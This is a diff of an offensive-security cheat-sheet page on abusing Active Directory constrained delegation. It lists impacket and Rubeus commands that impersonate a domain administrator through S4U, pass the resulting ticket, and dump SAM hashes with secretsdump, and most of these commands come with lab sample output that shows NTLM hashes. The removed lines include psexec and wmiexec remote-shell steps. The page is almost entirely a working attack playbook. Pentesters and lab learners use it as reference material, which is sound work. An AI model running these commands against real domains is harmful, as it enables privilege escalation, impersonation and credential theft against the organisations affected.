@@ -1,9 +1,11 @@
 ---
 title: "AllowedToDelegate"
-tags: ["Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "AllowedToDelegate", "Active Directory", "Windows", "AddAllowedtoAct", "AllowedToAct"]
+tags: ["Active Directory", "AllowedToDelegate", "AddAllowedtoAct", "AllowedToAct", "Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "Windows"]
 ---
 
-### Privesc #1: Forge a Ticket
+{{< filter_buttons >}}
+
+### Forge a Ticket
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
@@ -11,112 +13,200 @@ tags: ["Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "AllowedToD
 
 #### 1. Pre-Check
 
-```console
+```console {class="password"}
 # Password
 impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 ```
 
-```console
+```console {class="sample-code"}
+$ impacket-findDelegation 'intelligence.htb/svc_int$:Password123!' -dc-ip 10.129.31.133
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists 
+-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
+svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No 
+```
+
+```console {class="ntlm"}
 # NTLM
-impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC_IP> -hashes :<HASH> -no-pass
+impacket-findDelegation '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ impacket-findDelegation 'intelligence.htb/svc_int$' -hashes :655fefd062c233e273bb9f0566384474 -dc-ip 10.129.31.133
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists 
+-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
+svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No 
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 'dc.intelligence.htb' && impacket-findDelegation 'intelligence.htb/svc_int$:Password123!' -k -dc-ip 10.129.31.133
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting machine hostname
+[-] CCache file is not found. Skipping...
+AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists 
+-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
+svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 'dc.intelligence.htb' && impacket-findDelegation 'intelligence.htb/svc_int$' -hashes :655fefd062c233e273bb9f0566384474 -k -dc-ip 10.129.31.133
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting machine hostname
+[-] CCache file is not found. Skipping...
+AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists 
+-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
+svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No 
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -k -no-pass -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 'dc.intelligence.htb' && impacket-findDelegation 'intelligence.htb/svc_int$' -k -no-pass -dc-ip 10.129.31.133
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting machine hostname
+AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists 
+-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
+svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No
 ```
 
 #### 2. Get a Service Ticket
 
-```console
-sudo ntpdate -s <DC_IP> && impacket-getST -dc-ip <DC_IP> -spn '<SERVICE>/<TARGET_DOMAIN>' -hashes :<HASH> -impersonate '<IMPERSONATE_USER>' '<DOMAIN>/<USER>'
+```console {class="password"}
+# Password
+sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s dc.intelligence.htb && impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4 -impersonate Administrator 'intelligence.htb/svc_int'
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+$ impacket-getST 'intelligence.htb/svc_int$:Password123!' -dc-ip 10.129.31.133 -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] CCache file is not found. Skipping...
 [*] Getting TGT for user
-[*] Impersonating Administrator
+[*] Impersonating administrator
 [*] Requesting S4U2self
 [*] Requesting S4U2Proxy
-[*] Saving ticket in Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 ```
 
-#### 3. Convert Ticket \[Optional\]
-
-```console
-python3 rubeustoccache.py '<BASE64_TICKET>' '<IMPERSONATE_USER>.kirbi' '<IMPERSONATE_USER>.ccache'
-```
-
-```console {class="sample-code"}
-python3 ~/Tools/RubeusToCcache/rubeustoccache.py 'doIG9DCCBv ---[SNIP]--- 9yZS5jb20=' 'administrator.kirbi' 'administrator.ccache'
-╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
-╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
-╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
-              By Solomon Sklash
-          github.com/SolomonSklash
-   Inspired by Zer1t0's ticket_converter.py
-
-[*] Writing decoded .kirbi file to administrator.kirbi
-[*] Writing converted .ccache file to administrator.ccache
-[*] All done! Don't forget to set your environment variable: export KRB5CCNAME=administrator.ccache
-```
-
-#### 4. Remote
-
-```console
-export KRB5CCNAME='<CCACHE_FILE>'
+```console {class="ntlm"}
+# NTLM
+sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
 ```
 
 ```console {class="sample-code"}
-$ export KRB5CCNAME=Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+$ impacket-getST 'intelligence.htb/svc_int$' -hashes :655fefd062c233e273bb9f0566384474 -dc-ip 10.129.31.133 -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 ```
 
-```console
-# psexec
-sudo ntpdate -s <DC_IP> && impacket-psexec '<DOMAIN>/<IMPERSONATE_USER>@<TARGET_DOMAIN>' -k -no-pass
-```
-
-```console {class="sample-code"}
-$ impacket-psexec client.example.com/administrator@dc01.client.example.com -k -no-pass
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
-
-[*] Requesting shares on dc01.client.example.com.....
-[*] Found writable share ADMIN$
-[*] Uploading file MOjmtmkC.exe
-[*] Opening SVCManager on dc01.client.example.com.....
-[*] Creating service NTdz on dc01.client.example.com.....
-[*] Starting service NTdz.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>
-```
-
-```console
-# wmiexec
-sudo ntpdate -s <DC_IP> && wmiexec.py '<DOMAIN>/<IMPERSONATE_USER>@<TARGET_DOMAIN>' -k -no-pass
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s dc.intelligence.htb && wmiexec.py -k -no-pass administrator@dc.intelligence.htb
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+$ sudo ntpdate -s dc.intelligence.htb && impacket-getST 'intelligence.htb/svc_int$:Password123!' -k -dc-ip 10.129.31.133 -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] SMBv3.0 dialect used
-[!] Launching semi-interactive shell - Careful what you execute
-[!] Press help for extra shell commands
-C:\>
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s dc.intelligence.htb && impacket-getST 'intelligence.htb/svc_int$' -hashes :655fefd062c233e273bb9f0566384474 -k -dc-ip 10.129.31.133 -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>' -k -no-pass -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s dc.intelligence.htb && impacket-getST 'intelligence.htb/svc_int$' -k -no-pass -dc-ip 10.129.31.133 -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+```
+
+#### 3. Secrets Dump
+
+```console
+# Pass-the-ticket
+export KRB5CCNAME='<CCACHE>'
+```
+
+```console {class="sample-code"}
+export KRB5CCNAME='administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache'
 ```
 
 ```console
-# Secretsdump
-sudo ntpdate -s <DC_IP> && impacket-secretsdump <TARGET_DOMAIN> -k -no-pass
+# Ticket-based Kerberos
+sudo ntpdate -s <DC> && impacket-secretsdump '<DOMAIN>/<TARGET_USER>@<TARGET>' -k -no-pass
 ```
 
-<small>*Note: impacket-wmiexec may not work*</small>
+```console {class="sample-code"}
+$ sudo ntpdate -s dc.intelligence.htb && impacket-secretsdump 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xcae14f646af6326ace0e1f5b8b4146df
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0054cc2f7ff3b56d9e47eb39c89b521f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+---[SNIP]---
+```
 
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
-#### 1. Add Delegate \[Optional\]
+#### 1. Add Delegation \[Optional\]
 
 ```console
 # Import PowerView
@@ -137,7 +227,7 @@ Get-NetUser -TrustedToAuth
 {{< tab set1-2 tab1 active >}}Hash{{< /tab >}}{{< tab set1-2 tab2 >}}Kerberos{{< /tab >}}
 {{< tabcontent set1-2 tab1 >}}
 
-#### 3. Calculate Hash
+#### 3. Get NTLM Hash
 
 ```console
 .\rubeus.exe hash /password:'<PASSWORD>' /user:'<USER>' /domain:<DOMAIN>
@@ -146,7 +236,7 @@ Get-NetUser -TrustedToAuth
 #### 4. Get a Service Ticket
 
 ```console
-.\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
+.\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<TARGET_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
 ```
 
 ```console {class="sample-code"}
@@ -195,13 +285,13 @@ Get-NetUser -TrustedToAuth
 
 ```console
 # Or Create a sacrificial process
-.\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
+.\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<TARGET_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
 ```
 
 {{< /tabcontent >}}
 {{< tabcontent set1-2 tab2 >}}
 
-#### 3. Request a TGT
+#### 3. Request a Ticket
 
 ```console
 .\rubeus.exe tgtdeleg /nowrap /ptt
@@ -210,12 +300,12 @@ Get-NetUser -TrustedToAuth
 #### 4. Get a Service Ticket
 
 ```console
-.\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
+.\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<TARGET_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
 ```
 
 ```console
 # Or Create a sacrificial process
-.\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<IMPERSONATE_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
+.\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<TARGET_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
 ```
 
 {{< /tabcontent >}}
@@ -234,7 +324,7 @@ $session = new-pssession -computername <COMPUTER_NAME>
 
 ```console
 # Execute cmd
-invoke-command $session { <CMD> }
+Invoke-Command $session { <CMD> }
 ```
 
 {{< /tabcontent >}}
